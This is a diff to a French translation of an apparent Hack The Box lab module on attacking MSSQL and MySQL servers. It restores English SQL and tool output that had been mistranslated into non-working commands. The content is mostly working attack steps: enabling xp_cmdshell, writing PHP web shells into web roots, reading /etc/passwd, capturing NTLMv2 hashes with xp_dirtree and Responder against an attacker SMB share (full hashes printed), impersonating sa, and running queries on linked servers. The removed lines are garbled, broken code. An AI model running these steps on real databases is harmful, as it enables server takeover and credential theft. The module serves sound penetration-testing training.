@@ -144,7 +144,7 @@ dsgsec@htb[/htb]$ mssqlclient.py -p 1433 julio@10.129.203.7
 
 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 
-Mot de passe : MonMotDePasse !
+Mot de passe : MonMotDePasse!
 
 [*] Cryptage requis, passage à TLS
 [*] ENVCHANGE(DATABASE) : ancienne valeur : maître, nouvelle valeur : maître
@@ -201,7 +201,7 @@ Schémas/bases de données système par défaut "MSSQL" :
 Afficher les bases de données
 
 ```
-mysql> AFFICHER LES BASES DE DONNÉES ;
+mysql> SHOW DATABASES;
 
 +--------------------+
 | Base de données |
@@ -218,12 +218,12 @@ Si nous utilisons `sqlcmd`, nous devrons utiliser `GO` après notre requête 
 Afficher les bases de données
 
 ```
-1> SELECT nom DE master.dbo.sysdatabases
-2> ALLER
+1> SELECT name FROM master.dbo.sysdatabases
+2> GO
 
-nom
+name
 --------------------------------------------------
-maître
+master
 tempdb
 modèle
 msdb
@@ -236,7 +236,7 @@ htbusers
 Sélectionnez une base de données
 
 ```
-mysql> UTILISER htbusers ;
+mysql> USE htbusers;
 
 Base de données modifiée
 
@@ -245,8 +245,8 @@ Base de données modifiée
 Sélectionnez une base de données
 
 ```
-1> UTILISER les htbusers
-2> ALLER
+1> USE htbusers
+2> GO
 
 Changement du contexte de la base de données en 'htbusers'.
 
@@ -257,7 +257,7 @@ Changement du contexte de la base de données en 'htbusers'.
 Afficher les tableaux
 
 ```
-mysql> AFFICHER LES TABLES ;
+mysql> SHOW TABLES;
 
 +-----------------------------------+
 | Tables_in_htbusers |
@@ -279,7 +279,7 @@ Afficher les tableaux
 
 ```
 1> SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES
-2> ALLER
+2> GO
 
 nom de la table
 --------------------------------
@@ -300,7 +300,7 @@ utilisateurs
 Sélectionnez toutes les données de la table "utilisateurs"
 
 ```
-mysql> SELECT * FROM utilisateurs ;
+mysql> SELECT * FROM users;
 
 +----+---------------+------------+--------------- ------+
 | identifiant | nom d'utilisateur | mot de passe | date_d'adhésion |
@@ -317,8 +317,8 @@ mysql> SELECT * FROM utilisateurs ;
 Sélectionnez toutes les données de la table "utilisateurs"
 
 ```
-1> SÉLECTIONNER * DES utilisateurs
-2> allez
+1> SELECT * FROM users
+2> GO
 
 id nom d'utilisateur mot de passe data_of_joining
 ----------- -------------------- ----------- --- --------------------
@@ -352,9 +352,9 @@ XP_CMDSHELL
 
 ```
 1> xp_cmdshell 'whoami'
-2> ALLER
+2> GO
 
-sortir
+exit
 -----------------------------
 pas de service\mssql$sqlexpress
 NUL
@@ -367,21 +367,21 @@ Si `xp_cmdshell` n'est pas activé, nous pouvons l'activer, si nous disposons 
 Code : mssql
 
 ```
--- Pour permettre la modification des options avancées.
-EXÉCUTER sp_configure 'afficher les options avancées', 1
-ALLER
+-- To allow advanced options to be changed.  
+EXECUTE sp_configure 'show advanced options', 1
+GO
 
--- Pour mettre à jour la valeur actuellement configurée pour les options avancées.
-RECONFIGURER
-ALLER
+-- To update the currently configured value for advanced options.  
+RECONFIGURE
+GO  
 
--- Pour activer la fonction.
-EXÉCUTER sp_configure 'xp_cmdshell', 1
-ALLER
+-- To enable the feature.  
+EXECUTE sp_configure 'xp_cmdshell', 1
+GO  
 
--- Pour mettre à jour la valeur actuellement configurée pour cette fonctionnalité.
-RECONFIGURER
-ALLER
+-- To update the currently configured value for this feature.  
+RECONFIGURE
+GO
 
 ```
 
@@ -403,7 +403,7 @@ MySQL - Écrire un fichier local
 ```
 mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
 
-Requête OK, 1 ligne affectée (0,001 s)
+Query OK, 1 row affected (0.001 sec)
 
 ```
 
@@ -422,15 +422,15 @@ Dans l'exemple suivant, nous pouvons voir que la variable `secure_file_priv` e
 MySQL - Privilèges de fichiers sécurisés
 
 ```
-mysql> affiche des variables comme "secure_file_priv" ;
+mysql> show variables like "secure_file_priv";
 
-+-----------------+-------+
-| nom_variable | Valeur |
-+-----------------+-------+
-| secure_file_priv | |
-+-----------------+-------+
++------------------+-------+
+| Variable_name    | Value |
++------------------+-------+
+| secure_file_priv |       |
++------------------+-------+
 
-1 rangée en série (0,005 s)
+1 row in set (0.005 sec)
 
 ```
 
@@ -441,14 +441,14 @@ Pour écrire des fichiers à l'aide `MSSQL`, nous devons activer [Ole Automati
 MSSQL - Activer les procédures d'automatisation Ole
 
 ```
-1> sp_configure 'afficher les options avancées', 1
-2> ALLER
-3> RECONFIGURER
-4> ALLER
-5> sp_configure 'Procédures d'automatisation Ole', 1
-6> ALLER
-7> RECONFIGURER
-8> ALLER
+1> sp_configure 'show advanced options', 1
+2> GO
+3> RECONFIGURE
+4> GO
+5> sp_configure 'Ole Automation Procedures', 1
+6> GO
+7> RECONFIGURE
+8> GO
 
 ```
 
@@ -457,14 +457,14 @@ MSSQL - Activer les procédures d'automatisation Ole
 MSSQL - Créer un fichier
 
 ```
-1> DÉCLARER @OLE INT
-2> DÉCLARER @FileID INT
-3> EXÉCUTER sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
-4> EXÉCUTER sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
-5> EXÉCUTER sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
-6> EXÉCUTER sp_OADestroy @IDFichier
-7> EXÉCUTER sp_OADestroy @OLE
-8> ALLER
+1> DECLARE @OLE INT
+2> DECLARE @FileID INT
+3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
+4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
+5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
+6> EXECUTE sp_OADestroy @FileID
+7> EXECUTE sp_OADestroy @OLE
+8> GO
 
 ```
 
@@ -480,20 +480,20 @@ Par défaut, `MSSQL` autorise la lecture de fichiers sur n'importe quel fichie
 Lire les fichiers locaux dans MSSQL
 
 ```
-1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) COMME Contenu
-2> ALLER
+1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
+2> GO
 
-Colonne en vrac
+BulkColumn
 
--------------------------------------------------- ---------------------------
+-----------------------------------------------------------------------------
 # Copyright (c) 1993-2009 Microsoft Corp.
 #
-# Ceci est un exemple de fichier HOSTS utilisé par Microsoft TCP/IP pour Windows.
+# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
 #
-# Ce fichier contient les mappages des adresses IP aux noms d'hôtes. Chaque
-L'entrée # doit être conservée sur une ligne individuelle. L'adresse IP doit
+# This file contains the mappings of IP addresses to hostnames. Each
+# entry should be kept on an individual line. The IP address should
 
-(1 lignes concernées)
+(1 rows affected)
 
 ```
 
@@ -506,13 +506,13 @@ Comme nous l'avons mentionné précédemment, par défaut, une installation `My
 MySQL - Lire des fichiers locaux dans MySQL
 
 ```
-mysql> sélectionnez LOAD_FILE("/etc/passwd");
+mysql> select LOAD_FILE("/etc/passwd");
 
-+-----------------------------------+
-| CHARGER_FICHIER("/etc/passwd")
-+------------------------------------------------------------- -+
-racine:x:0:0:racine:/racine:/bin/bash
-démon:x:1:1:démon:/usr/sbin:/usr/sbin/nologin
++--------------------------+
+| LOAD_FILE("/etc/passwd")
++--------------------------------------------------+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
 sys:x:3:3:sys:/dev:/usr/sbin/nologin
 sync:x:4:65534:sync:/bin:/bin/sync
@@ -536,7 +536,7 @@ Vol de hachage XP_DIRTREE
 
 ```
 1> EXEC master..xp_dirtree '\\10.10.110.17\share\'
-2> ALLER
+2> GO
 
 profondeur de sous-répertoire
 --------------- -----------
@@ -549,7 +549,7 @@ Vol de hachage XP_SUBDIRS
 
 ```
 1> EXEC master..xp_subdirs '\\10.10.110.17\share\'
-2> ALLER
+2> GO
 
 HResult 0x55F6, niveau 16, état 1
 xp_subdirs n'a pas pu accéder à '\\10.10.110.17\share\*.*' : FindFirstFile() a renvoyé l'erreur 5, 'L'accès est refusé.'
@@ -563,19 +563,20 @@ Si le compte de service a accès à notre serveur, nous obtiendrons son hachage.
 Vol de hachage XP_SUBDIRS avec répondeur
 
 ```
-dsgsec@htb[/htb]$ répondeur sudo -I tun0
+dsgsec@htb[/htb]$ sudo responder -I tun0
 
-                                          __
-   .----.-----.-----.-----.-----.-----.--| |.-----.----.
-   | _| -__|__ --| _ | _ | | _ || -__| _|
-   |__| |_____|_____| __|_____|__|__|_____||_____|__|
-                    |__|
+                                         __               
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|              
 <SNIP>
 
-[+] A l'écoute des événements...
+[+] Listening for events...
 
-[SMB] Client NTLMv2-SSP : 10.10.110.17
-[SMB] Nom d'utilisateur NTLMv2-SSP : SRVMSSQL\demouser
+[SMB] NTLMv2-SSP Client   : 10.10.110.17
+[SMB] NTLMv2-SSP Username : SRVMSSQL\demouser
+[SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:5e3ab1c4380b94a1:A18830632D52768440B7E2425C4A7107:0101000000000000009BFFB9DE3DD801D5448EF4D0BA034D0000000002000800510053004700320001001E00570049004E002D003500440050005A0033005200530032004F005800320004003400570049004E002D003500440050005A0033005200530032004F00580013456F0051005300470013456F004C004F00430041004C000300140051005300470013456F004C004F00430041004C000500140051005300470013456F004C004F00430041004C0007000800009BFFB9DE3DD80106000400020000000800300030000000000000000100000000200000ADCA14A9054707D3939B6A5F98CE1F6E5981AC62CEC5BEAD4F6200A35E8AD9170A0010000000000000000000000000000000000009001C0063006900660073002F00740065007300740069006E006700730061000000000000000000
 
 
 ```
@@ -585,21 +586,21 @@ dsgsec@htb[/htb]$ répondeur sudo -I tun0
 XP_SUBDIRS Hash Stealing avec impacket
 
 ```
-dsgsec@htb[/htb]$ partage sudo impacket-smbserver ./ -smb2support
+dsgsec@htb[/htb]$ sudo impacket-smbserver share ./ -smb2support
 
 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
-[*] Fichier de configuration analysé
-[*] Rappel ajouté pour UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
-[*] Rappel ajouté pour UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
-[*] Fichier de configuration analysé
-[*] Fichier de configuration analysé
-[*] Fichier de configuration analysé
-[*] Connexion entrante (10.129.203.7,49728)
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 
+[*] Config file parsed                                                 
+[*] Config file parsed                                                 
+[*] Config file parsed
+[*] Incoming connection (10.129.203.7,49728)
 [*] AUTHENTICATE_MESSAGE (WINSRV02\mssqlsvc,WINSRV02)
-[*] Utilisateur WINSRV02\mssqlsvc authentifié avec succès
-
-[*] Fermeture de la connexion (10.129.203.7,49728)
-[*] Connexions restantes []
+[*] User WINSRV02\mssqlsvc authenticated successfully                        
+[*] demouser::WIN7BOX:5e3ab1c4380b94a1:A18830632D52768440B7E2425C4A7107:0101000000000000009BFFB9DE3DD801D5448EF4D0BA034D0000000002000800510053004700320001001E00570049004E002D003500440050005A0033005200530032004F005800320004003400570049004E002D003500440050005A0033005200530032004F00580013456F0051005300470013456F004C004F00430041004C000300140051005300470013456F004C004F00430041004C000500140051005300470013456F004C004F00430041004C0007000800009BFFB9DE3DD80106000400020000000800300030000000000000000100000000200000ADCA14A9054707D3939B6A5F98CE1F6E5981AC62CEC5BEAD4F6200A35E8AD9170A0010000000000000000000000000000000000009001C0063006900660073002F00740065007300740069006E006700730061000000000000000000
+[*] Closing down connection (10.129.203.7,49728)                      
+[*] Remaining connections []
 
 ```
 
@@ -618,19 +619,19 @@ Identifier les utilisateurs que nous pouvons usurper
 
 ```
 1> SELECT distinct b.name
-2> À PARTIR de sys.server_permissions a
+2> FROM sys.server_permissions a
 3> INNER JOIN sys.server_principals b
 4> ON a.grantor_principal_id = b.principal_id
 5> WHERE a.permission_name = 'IMPERSONATE'
-6> ALLER
+6> GO
 
-nom
+name
 -----------------------------------------------
 sa
-Ben
+ben
 valentin
 
-(3 rangs concernés)
+(3 rows affected)
 
 ```
 
@@ -641,19 +642,19 @@ Pour avoir une idée des possibilités d'élévation de privilèges, vérifions 
 Vérification de notre utilisateur et de notre rôle actuels
 
 ```
-1> SÉLECTIONNER SYSTEM_USER
+1> SELECT SYSTEM_USER
 2> SELECT IS_SRVROLEMEMBER('sysadmin')
-3> allez
+3> go
 
 -----------
-juillet
+julio                                                                                                                    
 
-(1 lignes concernées)
+(1 rows affected)
 
 -----------
-           0
+          0
 
-(1 lignes concernées)
+(1 rows affected)
 
 ```
 
@@ -664,20 +665,20 @@ Comme l'indique la valeur renvoyée `0` , nous n'avons pas le rôle d'administ
 Usurper l'identité de l'utilisateur SA
 
 ```
-1> EXÉCUTER COMME LOGIN = 'sa'
-2> SÉLECTIONNER SYSTEM_USER
+1> EXECUTE AS LOGIN = 'sa'
+2> SELECT SYSTEM_USER
 3> SELECT IS_SRVROLEMEMBER('sysadmin')
-4> ALLER
+4> GO
 
 -----------
 sa
 
-(1 lignes concernées)
+(1 rows affected)
 
 -----------
-           1
+          1
 
-(1 lignes concernées)
+(1 rows affected)
 
 ```
 
@@ -702,14 +703,14 @@ Identifier les serveurs liés dans MSSQL
 
 ```
 1> SELECT srvname, isremote FROM sysservers
-2> ALLER
+2> GO
 
-nom_serveur est distant
+srvname                             isremote
 ----------------------------------- --------
-BUREAU-MFERMN4\SQLEXPRESS 1
-10.0.0.12\SQLEXPRESS 0
+DESKTOP-MFERMN4\SQLEXPRESS          1
+10.0.0.12\SQLEXPRESS                0
 
-(2 rangs concernés)
+(2 rows affected)
 
 ```
 
@@ -721,12 +722,12 @@ Identifier les serveurs liés dans MSSQL
 
 ```
 1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
-2> ALLER
+2> GO
 
------------------------------- -------------------- ---------- ------------------------------ ---------- -
-DESKTOP-0L9D4KA\SQLEXPRESS Microsoft SQL Server 2019 (RTM sa_remote 1
+------------------------------ ------------------------------ ------------------------------ -----------
+DESKTOP-0L9D4KA\SQLEXPRESS     Microsoft SQL Server 2019 (RTM sa_remote                                1
 
-(1 lignes concernées)
+(1 rows affected)
 
 ```
 
